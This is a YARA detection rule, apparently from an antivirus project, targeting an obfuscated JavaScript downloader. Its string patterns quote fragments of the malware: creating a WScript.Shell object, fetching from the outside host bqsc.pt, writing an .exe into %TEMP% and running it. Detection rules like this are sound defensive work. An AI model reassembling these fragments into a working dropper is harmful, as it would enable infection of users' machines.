rule sig_20160330_2ec4a62848919daceab0094c00671268 {
  meta:
    description = "datamaliciousorder - file 20160330_2ec4a62848919daceab0094c00671268.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "9c52fde9473049c5ae3762a17e93ab617843602356bc459ca0b2b082d69ec911"

  strings:
    $s1  = "var _C = function _ZT() {return WScript[_MO](\"WScript\"+\".Shell\");}(), _V = 11;" fullword ascii
    $s2  = "_Y[_B0](\"GET\", \"http://bqsc.pt/c6ska\", false);" fullword ascii
    $s3  = "function _WF(_OY, _G){_LV0 = _LV0 * 1; return _OY - _G;};" fullword ascii
    $s4  = "if (_Y[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function _SK(){return _D + \"\";};" fullword ascii
    $s6  = "function _N() {return _C[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"Phtc762OPkMLMUU.ex\" + \"e\";};" fullword ascii
    $s7  = "function _QW(_L){_C[\"Run\"](_L, _LV0, _LV0);};" fullword ascii
    $s8  = "function _B() {return ((_Z == true) && (_Z == _TI)) ? 1 : _LV0;};" fullword ascii
    $s9  = "var _WL = new this[\"Date\"]();" fullword ascii
    $s10 = "function _I(){return _MO;};" fullword ascii
    $s11 = "function _OJ(_U) {var _E = (1, 2, 3, 4, 5, _U); return _E;};" fullword ascii
    $s12 = "function _W()" fullword ascii
    $s13 = "return _WF(_I0, _J);" fullword ascii
    $s14 = "function _LV(){return 22;};" fullword ascii
    $s15 = " while (_QB){" fullword ascii
    $s16 = "_Z = true; " fullword ascii
    $s17 = "var _Z = false;" fullword ascii
    $s18 = "_TI = true; " fullword ascii
    $s19 = "var _TI = false;" fullword ascii
    $s20 = "var _MN = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}